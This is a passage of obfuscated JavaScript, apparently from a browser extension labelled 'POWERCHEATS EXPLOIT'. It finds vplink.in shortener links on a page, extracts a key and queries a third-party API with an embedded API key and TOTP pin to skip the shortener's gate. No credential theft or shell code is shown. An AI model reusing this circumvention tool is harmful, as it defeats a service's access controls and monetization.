      _0x22c702.error("VPLINK", "All key extraction methods failed for URL: " + _0x20fca9);
      return null;
    }
  }
  async function _0x14a095(_0x5bdf19) {
    _0x22c702.log("VIPTEAM", "Starting extraction process");
    _0x455c4e("🔍", "EXTRACTING VPLINK.IN FROM PAGE...", "#ff00ff", "log-highlight");
    await new Promise(_0x5097f4 => setTimeout(_0x5097f4, 800));
    const _0x2d9390 = _0x158666();
    if (!_0x2d9390) {
      _0x455c4e("❌", "NO VPLINK.IN URL FOUND ON PAGE", "#ff4757", "log-error");
      _0x455c4e("⚠", "PAGE EXTRACTION FAILED", "#ffa500", "log-highlight");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("📊", "FAILURE ANALYSIS", "#ff4757", "log-highlight");
      _0x455c4e("●", "STATUS: FAILED", "#ff4757");
      _0x455c4e("●", "MODULE: VIPTEAM", "#ff00ff");
      _0x45d06b = true;
      const _0x4d1e5b = {
        url: _0x3edb97.fallbackRedirectUrl,
        apiData: null,
        pin: _0x1e203f,
        isReal: false,
        serverMessage: "❌ NO VPLINK.IN URL FOUND",
        isError: true,
        isFakeUrl: true
      };
      _0x3db848 = _0x4d1e5b;
      _0xd07885 = Date.now() - _0x10c2be;
      _0x2d4127();
      return;
    }
    _0x455c4e("✅", "FOUND: " + (_0x2d9390.length > 50 ? _0x2d9390.substring(0, 50) + "..." : _0x2d9390), "#2ecc71", "log-success");
    const _0x56e1fd = _0x1a4a50(_0x2d9390);
    if (!_0x56e1fd) {
      _0x455c4e("❌", "FAILED TO EXTRACT KEY FROM URL", "#ff4757", "log-error");
      _0x455c4e("⚠", "KEY EXTRACTION FAILED", "#ffa500", "log-highlight");
      _0x45d06b = true;
      const _0x52af09 = {
        url: _0x3edb97.fallbackRedirectUrl,
        apiData: null,
        pin: _0x1e203f,
        isReal: false,
        serverMessage: "❌ KEY EXTRACTION FAILED",
        isError: true,
        isFakeUrl: true
      };
      _0x3db848 = _0x52af09;
      _0xd07885 = Date.now() - _0x10c2be;
      _0x2d4127();
      return;
    }
    _0x455c4e("🔑", "VP KEY: " + _0x56e1fd.toUpperCase(), "#ff00ff", "log-key-found");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("📡", "INITIALIZING VIPTEAM CONNECTION...", "#00f2ff", "log-highlight");
    await _0x4a36e9(_0x5bdf19, _0x56e1fd);
  }
  async function _0x4a36e9(_0x241aec, _0x2e4695, _0x59c391 = 1) {
    const _0x27a4da = 3;
    _0x22c702.log("VPLINK", "fetchVipteamRedirectUrl: type=" + _0x241aec + ", vpKey=" + _0x2e4695 + ", attempt=" + _0x59c391 + "/" + _0x27a4da);
    try {
      _0x22c702.log("VPLINK", "Generating TOTP pin...");
      const _0xb390ef = await _0x29290f.generate();
      _0x1e203f = _0xb390ef;
      _0x22c702.log("VPLINK", "PIN: " + _0xb390ef);
      const _0x43574d = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x241aec + "&key=" + _0x3edb97.apiKey + "&pin=" + _0xb390ef + "&vp=" + _0x2e4695;
      if (_0x59c391 > 1) {
        _0x455c4e("🔄", "ATTEMPT " + _0x59c391 + " OF " + _0x27a4da, "#ffa500", "log-highlight");
      }
      _0x455c4e("📡", "REQUESTING: " + _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x241aec + "&key=" + _0x3edb97.apiKey + "&pin=******&vp=" + _0x2e4695, "#4a5568");
      const _0x68820d = new AbortController();
      const _0x1b0526 = setTimeout(() => {
        _0x22c702.log("VPLINK", "Request timeout, aborting...");
        _0x68820d.abort();
      }, 15000);
      const _0x609bd = performance.now();
      const _0x5d0ad8 = await fetch(_0x43574d, {
        signal: _0x68820d.signal,
        headers: {
          Accept: "application/json",
          "Cache-Control": "no-cache"
        }
      });
      clearTimeout(_0x1b0526);
      _0x22c702.log("VPLINK", "Response: " + _0x5d0ad8.status + " (" + (performance.now() - _0x609bd).toFixed(0) + "ms)");
      _0x455c4e("📡", "RESPONSE: " + _0x5d0ad8.status + " " + _0x5d0ad8.statusText, _0x5d0ad8.ok ? "#2ecc71" : "#ff4757");
      if (!_0x5d0ad8.ok) {
        _0x22c702.log("VPLINK", "Trying previous TOTP window...");
        const _0x51c2ce = await _0x29290f.generate(-1);
        _0x1e203f = _0x51c2ce;
        _0x455c4e("🔐", "CHECKING PREVIOUS WINDOW...", "#00f2ff");
        const _0x191531 = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x241aec + "&key=" + _0x3edb97.apiKey + "&pin=" + _0x51c2ce + "&vp=" + _0x2e4695;
        const _0xd9ec97 = await fetch(_0x191531, {
          headers: {
            Accept: "application/json"
          }
        });
        _0x22c702.log("VPLINK", "Retry response: " + _0xd9ec97.status);
        _0x455c4e("📡", "RETRY RESPONSE: " + _0xd9ec97.status, _0xd9ec97.ok ? "#2ecc71" : "#ff4757");
        if (!_0xd9ec97.ok) {
          if (_0x59c391 < _0x27a4da) {
            _0x22c702.log("VPLINK", "Retrying (" + (_0x59c391 + 1) + "/" + _0x27a4da + ")...");
            _0x455c4e("⏳", "RETRYING (" + (_0x59c391 + 1) + "/" + _0x27a4da + ")...", "#ffa500");
            await new Promise(_0x3880a0 => setTimeout(_0x3880a0, 2000));
            return _0x4a36e9(_0x241aec, _0x2e4695, _0x59c391 + 1);
          }
          throw new Error("FAILED AFTER " + _0x27a4da + " ATTEMPTS");
        }
        const _0x5b8cee = await _0xd9ec97.json();
        _0x1d398b = _0x5b8cee;
        return _0xa84e7(_0x5b8cee, _0x51c2ce, _0x2e4695, _0x59c391);
      }
      const _0x3c2757 = await _0x5d0ad8.json();
      _0x22c702.log("VPLINK", "Response data received");
      _0x1d398b = _0x3c2757;
      return _0xa84e7(_0x3c2757, _0xb390ef, _0x2e4695, _0x59c391);
    } catch (_0x364a06) {
      _0x22c702.error("VPLINK", "Error: " + _0x364a06.message);
      _0x455c4e("❌", "ERROR: " + _0x364a06.message, "#ff4757", "log-error");
      if (_0x59c391 < _0x27a4da) {
        _0x22c702.log("VPLINK", "Retrying after error (" + (_0x59c391 + 1) + "/" + _0x27a4da + ")...");
        _0x455c4e("⏳", "RETRYING (" + (_0x59c391 + 1) + "/" + _0x27a4da + ")...", "#ffa500");
        await new Promise(_0x1d8168 => setTimeout(_0x1d8168, 2000));
        return _0x4a36e9(_0x241aec, _0x2e4695, _0x59c391 + 1);
      }
      _0x22c702.error("VPLINK", "All " + _0x27a4da + " attempts exhausted");
      _0x455c4e("❌", "ALL " + _0x27a4da + " ATTEMPTS EXHAUSTED", "#ff4757", "log-error");
      return _0x2eaeb2("❌ SERVER REJECTED AFTER MAX ATTEMPTS");
    }
  }
  function _0xa84e7(_0x5a2b1a, _0x49e272, _0x1c978a, _0x4146d1) {
    const _0x3e8b5b = 3;
    const _0x28d2a3 = _0x5a2b1a.destinationLink || _0x3edb97.fallbackRedirectUrl;
    _0x22c702.log("VPLINK", "Processing response, destination: " + (_0x28d2a3 || "N/A").substring(0, 60));
    _0x455c4e("📋", "PARSING SERVER RESPONSE...", "#00f2ff", "log-highlight");
    _0x455c4e("●", "TYPE: " + (_0x5a2b1a.type || "N/A").toUpperCase(), "#4a5568");
    _0x455c4e("●", "VERIFIED: " + (_0x5a2b1a.verified ? "✅ YES" : "❌ NO"), _0x5a2b1a.verified ? "#2ecc71" : "#ff4757");
    _0x455c4e("●", "OWNER: " + (_0x5a2b1a.owner || "@A2MBD3"), "#718096");
    if (_0x5a2b1a.success !== undefined) {
      _0x455c4e("●", "SUCCESS FLAG: " + _0x5a2b1a.success, _0x5a2b1a.success ? "#2ecc71" : "#ff4757");
    }
    if (_0x5a2b1a.destinationLink) {
      const _0x56db79 = _0x5a2b1a.destinationLink.length > 50 ? _0x5a2b1a.destinationLink.substring(0, 50) + "..." : _0x5a2b1a.destinationLink;
      _0x455c4e("🔗", "DESTINATION: " + _0x56db79, "#4a5568");
    }
    if (_0x481386(_0x28d2a3)) {
      _0x22c702.log("VPLINK", "Fake URL (Telegram link) detected");
      _0x455c4e("⚠", "FAKE URL DETECTED (Attempt " + _0x4146d1 + "/" + _0x3e8b5b + ")", "#ffa500", "log-highlight");
      if (_0x4146d1 < _0x3e8b5b) {
        _0x455c4e("🔄", "RETRYING... Attempt " + (_0x4146d1 + 1) + " of " + _0x3e8b5b, "#ffa500", "log-highlight");
        return _0x4a36e9(_0x5a2b1a.type || "vp", _0x1c978a, _0x4146d1 + 1);
      }
      _0x455c4e("❌", "ALL " + _0x3e8b5b + " ATTEMPTS FAILED — FAKE URLS", "#ff4757", "log-error");
      return _0x2eaeb2("❌ SERVER REJECTED — FAKE URLS AFTER MAX ATTEMPTS");
    } else if (_0x256efc(_0x28d2a3)) {
      _0x22c702.log("VPLINK", "Valid redirect URL found!");
      _0x455c4e("✅", "AUTHENTIC LINK FOUND!", "#2ecc71", "log-success");
      return _0x5f33b1(_0x28d2a3, _0x5a2b1a, _0x49e272);
    } else {
      _0x22c702.log("VPLINK", "Invalid URL format");
      _0x455c4e("⚠", "INVALID URL FORMAT (Attempt " + _0x4146d1 + "/" + _0x3e8b5b + ")", "#ffa500", "log-highlight");
      if (_0x4146d1 < _0x3e8b5b) {
        _0x455c4e("🔄", "RETRYING... Attempt " + (_0x4146d1 + 1) + " of " + _0x3e8b5b, "#ffa500", "log-highlight");
        return _0x4a36e9(_0x5a2b1a.type || "vp", _0x1c978a, _0x4146d1 + 1);
      }
      _0x455c4e("❌", "ALL " + _0x3e8b5b + " ATTEMPTS FAILED — INVALID URLS", "#ff4757", "log-error");
      return _0x2eaeb2("❌ SERVER REJECTED — INVALID URLS AFTER MAX ATTEMPTS");
    }
  }
  function _0x5f33b1(_0x599d63, _0xa94687, _0x10195d) {
    _0x22c702.log("VPLINK", "SUCCESS, redirect: " + _0x599d63.substring(0, 60));
    _0x7d8b23 = true;
    _0x4409c3 = Date.now();
    const _0x2c5579 = _0x4409c3 - _0x10c2be;
    _0x455c4e("✅", "LINK VERIFIED SUCCESSFULLY", "#2ecc71", "log-success");
    _0x455c4e("🎯", "TARGET ACQUIRED SUCCESSFULLY", "#2ecc71", "log-success");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("📊", "FINAL ANALYSIS", "#ffa500", "log-highlight");
    _0x455c4e("●", "STATUS: SUCCESS", "#2ecc71", "log-success");
    _0x455c4e("●", "TYPE: " + _0x3b3a2d.toUpperCase(), "#ff00ff");
    _0x455c4e("●", "ELAPSED: " + (_0x2c5579 / 1000).toFixed(1) + "s", "#4a5568");
    _0x455c4e("⚡", "LINK VERIFIED — NO FILLER LOGS", "#ff00ff", "log-key-found");
    _0x45d06b = true;
    const _0x2bcd2e = {
      url: _0x599d63,
      apiData: _0xa94687,
      pin: _0x10195d,
      isReal: true,
      serverMessage: "✅ LINK VERIFIED",
      isError: false,
      isFakeUrl: false
    };
    _0x3db848 = _0x2bcd2e;
    _0xd07885 = _0x2c5579;
    _0x2d4127();
    return _0x3db848;
  }
  function _0x2eaeb2(_0x3bd556) {
    _0x22c702.error("VPLINK", "FAILURE: " + _0x3bd556);
    _0x7d8b23 = false;
    _0x4409c3 = Date.now();
    const _0x4bee74 = _0x4409c3 - _0x10c2be;
    _0x455c4e("❌", _0x3bd556, "#ff4757", "log-error");
    _0x455c4e("⚠", "FALLBACK PROTOCOL ACTIVATED", "#ffa500", "log-highlight");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("📊", "FAILURE ANALYSIS", "#ff4757", "log-highlight");
    _0x455c4e("●", "STATUS: FAILED", "#ff4757");
    _0x455c4e("●", "TYPE: " + _0x3b3a2d.toUpperCase(), "#ff00ff");
    _0x455c4e("●", "ELAPSED: " + (_0x4bee74 / 1000).toFixed(1) + "s", "#4a5568");
    _0x45d06b = true;
    const _0x256d0f = {
      url: _0x3edb97.fallbackRedirectUrl,
      apiData: _0x1d398b,
      pin: _0x1e203f,
      isReal: false,
      serverMessage: _0x3bd556,
      isError: true,
      isFakeUrl: true
    };
    _0x3db848 = _0x256d0f;
    _0xd07885 = _0x4bee74;
    _0x2d4127();
    return _0x3db848;
  }
  function _0x2c27dd(_0x33302f) {
    _0x22c702.log("UI", "Rendering POWERCHEATS EXPLOIT panel, apiType=" + _0x33302f);
    document.getElementById("nebula-exploit")?.remove();
    _0x45d06b = false;
    _0x3db848 = null;
    _0x2850af = false;
    _0x1d9364 = [];
    _0x149fe9 = false;
    const _0x54ba31 = document.createElement("div");
    _0x54ba31.id = "nebula-exploit";
    _0x54ba31.className = "nb-overlay";
    const {
      wrapper: _0x4f9cfa
    } = _0x154f83("\n      <button id=\"exploit-music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-exploit-header\">\n        <span class=\"nb-live-dot\"></span>\n        <span style=\"width:7px;height:7px;background:#ff00ff;border-radius:50%;box-shadow:0 0 6px #ff00ff;flex-shrink:0;\"></span>\n        <span style=\"width:7px;height:7px;background:var(--electric-glow-1);border-radius:50%;box-shadow:0 0 6px var(--electric-glow-1);flex-shrink:0;\"></span>\n        <span class=\"nb-exploit-title\">" + _0x3c10b7 + "://" + _0x50c9a2.name.replace(/\s+/g, "_").toUpperCase() + "</span>\n        <span id=\"nb-live-status\" style=\"color:var(--info-color);font-size:8px;margin-left:auto;animation:nb-pulse 1.5s infinite;flex-shrink:0;font-weight:700;\">● LIVE</span>\n      </div>\n      \n      <div id=\"log-output\" class=\"nb-log-area\"></div>\n      \n      <div class=\"nb-progress-label\">\n        <span>PROGRESS</span>\n        <span id=\"nb-progress-pct\" style=\"font-weight:700;\">0%</span>\n      </div>\n      <div class=\"nb-progress-bar-bg\">\n        <div id=\"nb-progress-exploit\" class=\"nb-progress-bar-fill\"></div>\n      </div>\n      \n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ");
    _0x54ba31.appendChild(_0x4f9cfa);
    document.body.appendChild(_0x54ba31);
    _0x2a5e40("exploit-music-btn");
    _0x4a2c1e();
    _0x455c4e("⚡", _0x1db9e0 + " — " + _0x426943, "#ff00ff", "log-highlight");
    _0x455c4e("◆", "PLATFORM: " + navigator.platform.toUpperCase(), "#718096");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("⚙", "SYSTEM CONFIGURATION", "#ffa500", "log-highlight");
    _0x455c4e("●", "STATUS: ACTIVE", "#2ecc71", "log-success");
    _0x455c4e("●", "MODULE: POWERCHEATS EXTRACTOR", "#ff00ff");
    _0x455c4e("●", "API ENDPOINT: " + _0x3edb97.apiBaseUrl, "#4a5568");
    _0x455c4e("●", "API KEY: " + _0x3edb97.apiKey, "#4a5568");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("👤", "USER PROFILE", "#ffa500", "log-highlight");
    _0x455c4e("●", "NAME: " + _0x50c9a2.name.toUpperCase(), "#4a5568");
    _0x455c4e("●", "USER ID: " + _0x50c9a2.id, "#4a5568");
    _0x455c4e("●", "AUTH REQUIRED: " + (_0x4048be() ? "YES" : "NO"), _0x4048be() ? "#ffa500" : "#2ecc71");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("🔍", "SCANNING PAGE FOR VPLINK.IN (POWERCHEATS)...", "#ff00ff", "log-highlight");
    _0x10c2be = Date.now();
    _0xd07885 = _0x3edb97.minProgressTime;
    _0x19023b();
    _0x3db18f(_0x33302f);
  }
  function _0x1209f7() {
    try {
      _0x22c702.log("POWERCHEATS", "Starting PowerCheats vplink.in scan...");
      const _0x376339 = window.location.href;
      if (_0x376339.includes("vplink.in")) {
        const _0x5f2e27 = _0x376339.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
        if (_0x5f2e27) {
          const _0x373bad = _0x5f2e27[0].replace(/[.,;:'")\]}]+$/, "");
          _0x22c702.log("POWERCHEATS", "Method 1 - Found in window.location.href: " + _0x373bad);
          return _0x373bad;
        }
        _0x22c702.log("POWERCHEATS", "Method 1 - Raw URL: " + _0x376339);
        return _0x376339;
      }
      _0x22c702.log("POWERCHEATS", "Method 1 failed, trying Method 2: script tag extraction...");
      const _0x114eba = document.querySelectorAll("script");
      for (let _0x1250e1 of _0x114eba) {
        const _0x51cd41 = _0x1250e1.textContent || _0x1250e1.innerText || "";
        const _0x5d28d0 = _0x51cd41.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
        if (_0x5d28d0 && _0x5d28d0[1] && _0x5d28d0[1].includes("vplink.in")) {
          const _0x50e2b9 = _0x5d28d0[1].replace(/[.,;:'")\]}]+$/, "");
          _0x22c702.log("POWERCHEATS", "Method 2 - Extracted from script: " + _0x50e2b9);
          return _0x50e2b9;
        }
      }
      _0x22c702.log("POWERCHEATS", "Method 2 failed, trying Method 3: full HTML scan...");
      const _0x5d7dd0 = document.documentElement.innerHTML;
      const _0x3740cb = _0x5d7dd0.match(/https?:\/\/vplink\.in\/[^\s"'<>]+/);
      if (_0x3740cb) {
        const _0x57e42f = _0x3740cb[0].replace(/[.,;:'")\]}]+$/, "");
        _0x22c702.log("POWERCHEATS", "Method 3 - Found in HTML: " + _0x57e42f);
        return _0x57e42f;
      }
      _0x22c702.log("POWERCHEATS", "No vplink.in URL found after all 3 methods");
      return null;
    } catch (_0x213042) {
      _0x22c702.error("POWERCHEATS", "Extraction error: " + _0x213042.message);
      return null;
    }
  }
  async function _0x3db18f(_0x25bff4) {
    _0x22c702.log("POWERCHEATS", "Starting PowerCheats extraction process");
    _0x455c4e("🔍", "EXTRACTING VPLINK.IN USING POWERCHEATS METHODS...", "#ff00ff", "log-highlight");
    await new Promise(_0x43fb57 => setTimeout(_0x43fb57, 800));
    const _0x35dc04 = _0x1209f7();
    if (!_0x35dc04) {
      _0x455c4e("❌", "NO VPLINK.IN URL FOUND ON PAGE", "#ff4757", "log-error");
      _0x455c4e("⚠", "ALL 3 EXTRACTION METHODS FAILED", "#ffa500", "log-highlight");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("📊", "FAILURE ANALYSIS", "#ff4757", "log-highlight");
      _0x455c4e("●", "STATUS: FAILED", "#ff4757");
      _0x455c4e("●", "MODULE: POWERCHEATS", "#ff00ff");
      _0x455c4e("●", "METHOD 1 (location.href): FAILED", "#718096");
      _0x455c4e("●", "METHOD 2 (script tag): FAILED", "#718096");
      _0x455c4e("●", "METHOD 3 (HTML scan): FAILED", "#718096");
      _0x45d06b = true;
      const _0x3ce882 = {
        url: _0x3edb97.fallbackRedirectUrl,
        apiData: null,
        pin: _0x1e203f,
        isReal: false,
        serverMessage: "❌ NO VPLINK.IN URL FOUND",
        isError: true,
        isFakeUrl: true
      };
      _0x3db848 = _0x3ce882;
      _0xd07885 = Date.now() - _0x10c2be;
      _0x2d4127();
      return;
    }
    _0x455c4e("✅", "FOUND: " + (_0x35dc04.length > 50 ? _0x35dc04.substring(0, 50) + "..." : _0x35dc04), "#2ecc71", "log-success");
    const _0x35daf3 = _0x1a4a50(_0x35dc04);
    if (!_0x35daf3) {
      _0x455c4e("❌", "FAILED TO EXTRACT KEY FROM URL", "#ff4757", "log-error");
      _0x455c4e("⚠", "KEY EXTRACTION FAILED", "#ffa500", "log-highlight");
      _0x45d06b = true;
      const _0x311281 = {
        url: _0x3edb97.fallbackRedirectUrl,
        apiData: null,
        pin: _0x1e203f,
        isReal: false,
        serverMessage: "❌ KEY EXTRACTION FAILED",
        isError: true,
        isFakeUrl: true
      };
      _0x3db848 = _0x311281;
      _0xd07885 = Date.now() - _0x10c2be;
      _0x2d4127();
      return;
    }
    _0x455c4e("🔑", "VP KEY: " + _0x35daf3.toUpperCase(), "#ff00ff", "log-key-found");
    _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
    _0x455c4e("📡", "INITIALIZING POWERCHEATS CONNECTION...", "#00f2ff", "log-highlight");
    await _0x4a36e9(_0x25bff4, _0x35daf3);
  }
  function _0x54683f(_0x455334) {
    _0x22c702.log("UI", "Rendering UNIVERSAL VPLINK panel, apiType=" + _0x455334);
    document.getElementById("nebula-exploit")?.remove();
    _0x45d06b = false;
    _0x3db848 = null;
    _0x2850af = false;
    _0x1d9364 = [];
    _0x149fe9 = false;
    function _0x2be0ce() {
      _0x78fd44 = false;
      _0x2850af = false;
      _0x45d06b = false;
      _0x3db848 = null;
      _0x1d9364 = [];
      _0x21e0aa = false;
      _0x254959 = false;
      if (_0x30b65e) {
        clearInterval(_0x30b65e);
        _0x30b65e = null;
      }
      const _0x24512a = document.getElementById("nb-progress-exploit");
      const _0x219717 = document.getElementById("nb-progress-pct");
      if (_0x24512a) {
        _0x24512a.style.transition = "none";
        _0x24512a.style.width = "0%";
        _0x24512a.classList.remove("error-fill", "vipteam-success");
      }
      if (_0x219717) {
        _0x219717.textContent = "0%";
      }
      const _0x27fa2e = document.getElementById("nb-live-status");
      if (_0x27fa2e) {
        _0x27fa2e.textContent = "● LIVE";
        _0x27fa2e.style.color = "var(--info-color)";
        _0x27fa2e.style.animation = "nb-pulse 1.5s infinite";
      }
      const _0x48c12a = document.getElementById("vplink-url-input");
      const _0x16395d = document.getElementById("vplink-submit-btn");
      if (_0x48c12a) {
        _0x48c12a.disabled = false;
        _0x48c12a.value = "";
        _0x48c12a.classList.remove("error", "success");
        _0x48c12a.focus();
      }
      if (_0x16395d) {
        _0x16395d.disabled = true;
      }
    }
    function _0x51afef(_0xa6315a) {
      _0x22c702.error("VPLINK", "FAILURE: " + _0xa6315a);
      _0x7d8b23 = false;
      _0x4409c3 = Date.now();
      const _0x3cdf16 = _0x4409c3 - _0x10c2be;
      _0x78fd44 = false;
      _0x455c4e("❌", _0xa6315a, "#ff4757", "log-error");
      _0x455c4e("⚠", "PLEASE TRY AGAIN WITH A VALID URL", "#ffa500", "log-highlight");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("📊", "FAILURE ANALYSIS", "#ff4757", "log-highlight");
      _0x455c4e("●", "STATUS: FAILED", "#ff4757");
      _0x455c4e("●", "TYPE: UNIVERSAL VPLINK", "#ff00ff");
      _0x455c4e("●", "ELAPSED: " + (_0x3cdf16 / 1000).toFixed(1) + "s", "#4a5568");
      _0x38dd9f();
      setTimeout(() => {
        _0x2be0ce();
      }, 2500);
    }
    function _0x4a077b(_0x1d5245, _0x43a1c2, _0x212f06, _0x1d50e1) {
      const _0x3e7a12 = 3;
      const _0x3e486d = _0x1d5245.destinationLink || null;
      _0x455c4e("📋", "PARSING SERVER RESPONSE...", "#00f2ff", "log-highlight");
      _0x455c4e("●", "TYPE: " + (_0x1d5245.type || "N/A").toUpperCase(), "#4a5568");
      _0x455c4e("●", "VERIFIED: " + (_0x1d5245.verified ? "✅ YES" : "❌ NO"), _0x1d5245.verified ? "#2ecc71" : "#ff4757");
      _0x455c4e("●", "OWNER: " + (_0x1d5245.owner || "@A2MBD3"), "#718096");
      if (_0x1d5245.destinationLink) {
        const _0x31dac5 = _0x1d5245.destinationLink.length > 50 ? _0x1d5245.destinationLink.substring(0, 50) + "..." : _0x1d5245.destinationLink;
        _0x455c4e("🔗", "DESTINATION: " + _0x31dac5, "#4a5568");
      }
      if (_0x481386(_0x3e486d)) {
        _0x455c4e("⚠", "FAKE URL DETECTED (Attempt " + _0x1d50e1 + "/" + _0x3e7a12 + ")", "#ffa500", "log-highlight");
        if (_0x1d50e1 < _0x3e7a12) {
          _0x455c4e("🔄", "RETRYING... Attempt " + (_0x1d50e1 + 1) + " of " + _0x3e7a12, "#ffa500", "log-highlight");
          return _0x416d69(_0x1d5245.type || "vp", _0x212f06, _0x1d50e1 + 1);
        }
        return _0x51afef("❌ SERVER REJECTED — FAKE URLS AFTER MAX ATTEMPTS");
      } else if (_0x256efc(_0x3e486d)) {
        _0x455c4e("✅", "AUTHENTIC VPLINK REDIRECT FOUND!", "#2ecc71", "log-success");
        return _0x5f33b1(_0x3e486d, _0x1d5245, _0x43a1c2);
      } else {
        _0x455c4e("⚠", "INVALID URL FORMAT (Attempt " + _0x1d50e1 + "/" + _0x3e7a12 + ")", "#ffa500", "log-highlight");
        if (_0x1d50e1 < _0x3e7a12) {
          _0x455c4e("🔄", "RETRYING... Attempt " + (_0x1d50e1 + 1) + " of " + _0x3e7a12, "#ffa500", "log-highlight");
          return _0x416d69(_0x1d5245.type || "vp", _0x212f06, _0x1d50e1 + 1);
        }
        return _0x51afef("❌ SERVER REJECTED — INVALID URLS AFTER MAX ATTEMPTS");
      }
    }
    async function _0x416d69(_0x5e265a, _0x5d65a8, _0x37d5f7) {
      _0x37d5f7 = _0x37d5f7 || 1;
      const _0x4e582d = 3;
      _0x22c702.log("VPLINK", "fetchUniversalVplinkRedirectUrl: type=" + _0x5e265a + ", vpKey=" + _0x5d65a8 + ", attempt=" + _0x37d5f7 + "/" + _0x4e582d);
      try {
        const _0x506f3c = await _0x29290f.generate();
        _0x1e203f = _0x506f3c;
        const _0x1861bf = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x5e265a + "&key=" + _0x3edb97.apiKey + "&pin=" + _0x506f3c + "&vp=" + _0x5d65a8;
        if (_0x37d5f7 > 1) {
          _0x455c4e("🔄", "ATTEMPT " + _0x37d5f7 + " OF " + _0x4e582d, "#ffa500", "log-highlight");
        }
        _0x455c4e("📡", "REQUESTING: " + _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x5e265a + "&key=" + _0x3edb97.apiKey + "&pin=******&vp=" + _0x5d65a8, "#4a5568");
        const _0x2dc15f = new AbortController();
        const _0x124190 = setTimeout(() => _0x2dc15f.abort(), 15000);
        const _0x578ad6 = {
          signal: _0x2dc15f.signal,
          headers: {
            Accept: "application/json",
            "Cache-Control": "no-cache"
          }
        };
        const _0x22edb0 = await fetch(_0x1861bf, _0x578ad6);
        clearTimeout(_0x124190);
        _0x455c4e("📡", "RESPONSE: " + _0x22edb0.status + " " + _0x22edb0.statusText, _0x22edb0.ok ? "#2ecc71" : "#ff4757");
        if (!_0x22edb0.ok) {
          const _0x1844b7 = await _0x29290f.generate(-1);
          _0x1e203f = _0x1844b7;
          _0x455c4e("🔐", "CHECKING PREVIOUS WINDOW...", "#00f2ff");
          const _0x5bd6f6 = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0x5e265a + "&key=" + _0x3edb97.apiKey + "&pin=" + _0x1844b7 + "&vp=" + _0x5d65a8;
          const _0x5a94bf = await fetch(_0x5bd6f6, {
            headers: {
              Accept: "application/json"
            }
          });
          _0x455c4e("📡", "RETRY RESPONSE: " + _0x5a94bf.status, _0x5a94bf.ok ? "#2ecc71" : "#ff4757");
          if (!_0x5a94bf.ok) {
            if (_0x37d5f7 < _0x4e582d) {
              _0x455c4e("⏳", "RETRYING (" + (_0x37d5f7 + 1) + "/" + _0x4e582d + ")...", "#ffa500");
              await new Promise(_0x30e90f => setTimeout(_0x30e90f, 2000));
              return _0x416d69(_0x5e265a, _0x5d65a8, _0x37d5f7 + 1);
            }
            throw new Error("FAILED AFTER " + _0x4e582d + " ATTEMPTS");
          }
          const _0x2e11fe = await _0x5a94bf.json();
          _0x1d398b = _0x2e11fe;
          return _0x4a077b(_0x2e11fe, _0x1844b7, _0x5d65a8, _0x37d5f7);
        }
        const _0x34edc7 = await _0x22edb0.json();
        _0x1d398b = _0x34edc7;
        return _0x4a077b(_0x34edc7, _0x506f3c, _0x5d65a8, _0x37d5f7);
      } catch (_0x2abdc5) {
        _0x22c702.error("VPLINK", "Error: " + _0x2abdc5.message);
        _0x455c4e("❌", "ERROR: " + _0x2abdc5.message, "#ff4757", "log-error");
        if (_0x37d5f7 < _0x4e582d) {
          _0x455c4e("⏳", "RETRYING (" + (_0x37d5f7 + 1) + "/" + _0x4e582d + ")...", "#ffa500");
          await new Promise(_0x50035b => setTimeout(_0x50035b, 2000));
          return _0x416d69(_0x5e265a, _0x5d65a8, _0x37d5f7 + 1);
        }
        return _0x51afef("❌ SERVER REJECTED AFTER MAX ATTEMPTS");
      }
    }
    async function _0x247afa(_0x2c6360) {
      _0x22c702.log("VPLINK", "Starting universal extraction process");
      _0x455c4e("🔍", "EXTRACTING VP KEY FROM URL...", "#ff00ff", "log-highlight");
      await new Promise(_0x8c359d => setTimeout(_0x8c359d, 600));
      const _0xbb5702 = _0x1a4a50(_0x2c6360);
      if (!_0xbb5702) {
        _0x455c4e("❌", "FAILED TO EXTRACT KEY FROM URL", "#ff4757", "log-error");
        _0x455c4e("⚠", "KEY EXTRACTION FAILED — INVALID URL FORMAT", "#ffa500", "log-highlight");
        _0x45d06b = true;
        _0x3db848 = null;
        _0x78fd44 = false;
        _0x38dd9f();
        setTimeout(() => {
          _0x2be0ce();
        }, 2500);
        return;
      }
      _0x455c4e("✅", "VP KEY EXTRACTED: " + _0xbb5702.toUpperCase(), "#2ecc71", "log-success");
      _0x455c4e("🔑", "KEY: " + _0xbb5702.toUpperCase(), "#ff00ff", "log-key-found");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("📡", "INITIALIZING VPLINK CONNECTION...", "#00f2ff", "log-highlight");
      await _0x416d69(_0x455334, _0xbb5702, 1);
    }
    const _0x5a9c21 = document.createElement("div");
    _0x5a9c21.id = "nebula-exploit";
    _0x5a9c21.className = "nb-overlay";
    const {
      wrapper: _0x133887,
      focusGlow1: _0x343b6d,
      focusGlow2: _0x226728
